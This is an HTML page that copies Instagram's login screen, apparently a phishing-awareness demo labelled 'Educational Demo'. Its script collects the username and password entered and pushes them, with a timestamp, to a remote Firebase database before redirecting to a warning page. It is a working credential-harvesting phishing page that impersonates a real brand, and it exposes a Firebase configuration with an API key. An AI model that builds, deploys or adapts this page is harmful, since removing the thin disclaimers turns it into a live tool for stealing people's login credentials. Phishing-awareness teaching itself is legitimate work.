<!DOCTYPE html>
<html>
<head>
<title>Instagram</title>

<style>
body {
  background:#fafafa;
  font-family: Arial;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

.container {
  background:white;
  width:350px;
  border:1px solid #ddd;
  padding:30px;
  text-align:center;
  position:relative;
}

.badge {
  position:absolute;
  top:8px;
  right:8px;
  background:#ffcc00;
  padding:4px 8px;
  font-size:11px;
  border-radius:4px;
}

.logo {
  font-size:40px;
  font-weight:bold;
  margin-bottom:20px;
}

input {
  width:100%;
  padding:10px;
  margin:6px 0;
  border:1px solid #ccc;
  border-radius:4px;
}

button {
  width:100%;
  padding:10px;
  background:#3897f0;
  color:white;
  border:none;
  border-radius:4px;
  margin-top:10px;
  cursor:pointer;
}

.note {
  font-size:12px;
  color:#666;
  margin-top:10px;
}
</style>
</head>

<body>

<div class="container">
  <div class="badge">Educational Demo</div>

  <div class="logo">Instagram</div>

  <input id="user" placeholder="Phone number, username, or email">
  <input id="pass" type="password" placeholder="Password">

  <button onclick="saveLogin()">Log in</button>

  <div class="note">
  Demo project — do not use real password
  </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyAUGjpj082v0U9FKs0BHyF0gSAIFXfB3Zc",
  authDomain: "cyberinsta-58734.firebaseapp.com",
  databaseURL: "https://cyberinsta-58734-default-rtdb.firebaseio.com",
  projectId: "cyberinsta-58734",
  storageBucket: "yberinsta-58734.firebasestorage.app",
  appId: "1:521267157175:web:8e403db43785b59901d532"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

window.saveLogin = function() {
  const u = document.getElementById("user").value;
  const p = document.getElementById("pass").value;

  if(!u || !p){
    alert("Enter username and password");
    return;
  }

  push(ref(db,"experimentLogins"), {
    username: u,
    password: p,
    time: new Date().toString(),
    purpose: "cyber security demo"
  })
  .then(() => {
    console.log("Saved to Firebase ✅");
    window.location.href = "warning.html";
  })
  .catch((err) => {
    console.error(err);
    alert("Firebase save failed — check database rules");
  });
}
</script>

</body>
</html>
